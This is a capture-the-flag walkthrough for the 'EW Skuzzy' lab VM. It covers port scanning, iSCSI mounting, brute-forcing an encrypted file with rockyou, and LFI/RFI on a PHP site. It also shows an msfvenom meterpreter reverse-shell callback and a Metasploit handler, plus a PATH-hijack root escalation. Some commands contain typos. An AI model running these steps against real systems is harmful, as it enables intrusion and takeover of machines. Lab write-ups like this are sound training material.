@@ -1,0 +1,96 @@
+
+Hack the EW Skuzzy VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as EW skuzzy. The credit for making this vm machine goes to “vortexau” and it is another capture the flag where author has hidden flag for the attacker as a challenge. You can download this VM here.
+Let’s Breach!!!
+The target holds 192.168.1.112 as network IP; now using nmap lets find out open ports.
+nmap -sV 192.168.1.112
+From give image you can check port 22 for SSH, 80 for TCP and 3260 for iscsi are open in target network.
+
+We tried to connect it using ssh but didn’t find any clue, so we opened this IP in browser.
+
+Ok now we spent some time on this site after using dirb and nikto we found some troll flags.
+So we move on to the next port 3260 that is running the iscsi, ISCSI stands for Internet Small Computer Systems Interface. It is used for linking data storage facilities in a network.
+You can check which targets are available by using the iscsiadm utility. Enter the following in a terminal:
+iscsiadm -m discovery -t -st –p 192.168.1.112
+Then we connect to the data storage
+iscsiadm –m node –login
+
+Now we check if the data storage is available.
+fdisk –l
+
+We see that 1 new storage /dev/sdb is available. Now we will mount this storage to access it.
+mount /dev/sdb /root/Desktop/raj
+
+After mounting the storage device we move into the storage and check the content of the storage.
+
+We find our 1st flag, we also found a disk image inside the storage we now mount this disk to check the content of the disk.
+
+Now we move inside the disk storage we found an eml file “ToAlice.eml” and an encrypted file “ToAlice.csv.enc”. We open the eml file and find our 2nd flag.
+We also find that that the encrypted file is encrypted in 256-bit encryption through the eml file. 
+
+When we decrypt the file we find that it requires a password. So first we Bruteforce the encrypted file to obtain the password. The eml file also gave us the hint to use the rockyou wordlist. So we are going to use it for our bruteforce.
+bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -d sha256 -c AES-256-CBC ToAlice.csv.enc
+
+We now have the password “supercalifragilisticoespialdoso”. We use openssl to decrypt the file.
+openssl enc -d -aes256 -md sha256 -salt -in ToAlive.csv.enc -out alive -k supercalifragilisticoespialdoso
+
+We find the 3rd flag, we also found some random strings. We first tried to decrypt it but they weren’t encrypted in the first place. Then we found that these were actually page name.
+We open these in browser the first page gives us a site that doesn’t contain anything significant just some trolling.
+
+The second page contains some content that looks useful.
+
+After playing around the site we found our hint, we move to feed reader.
+
+We open the load feed link.
+
+Here we found our hint that there is a PHP file maybe hiding something useful so we use dirb to find all the php files inside this folder.
+dirb http://192.168.1.112/c2444910794e037ebd8aaf257178c90b/ -X .php
+
+Now we find all the php files in the folder. When we open these files it gives us another hint. After taking a look at the URL we found that RFI may be possible on this site.
+
+When we use RFI it says it requires an authentication key.
+
+So we move to LFI, we open the PHP files using curl through LFI. We use php filter to bypass the security.
+
+After scrolling down we found a base64 encoded string.
+
+After decoding the file we found the 4th flag.
+
+Now we open the other php files. After going through the files we found the next hint in “reader.php”.
+We open the “reader.php” using LFI.
+
+We again find a base64 string inside the file.
+
+After decoding the string we found it was a php code. In the code we found our next hint, it states that the key is 47 characters long. After going through all my notes I found that flag4 was 47 characters long so we used it as the key and it worked.
+
+Now we create a payload using msfvenom and save it as a text file.
+msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 > /root/Desktop/ra.txt
+
+After creating the file we then edit the file, we replace <?php with ##php##.
+
+Then we use RFI to execute the shell on the server to get the meterpreter. Also add the Key at the end of the url.
+
+We then start the listener in metasploit.
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.120
+set lport 4444
+exploit
+
+Using RFI we execute the payload and got the shell
+meterpreter > sysinfo
+meterpreter > shell
+Then we find executable files on the system
+find / -perm -4000 2>/dev/null
+
+We found the file /opt/alicebackup when we execute the file we found the file contains id command.
+So we copy /bin/sh into id
+cp /bin/sh id
+and export the path to tmp/ folder
+export PATH:/tmp/$PATH
+then execute the file /opt/alicebackup
+
+Now we when we execute the file, we get the root shell. After getting the root shell we move into the /root/ folder and find the final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
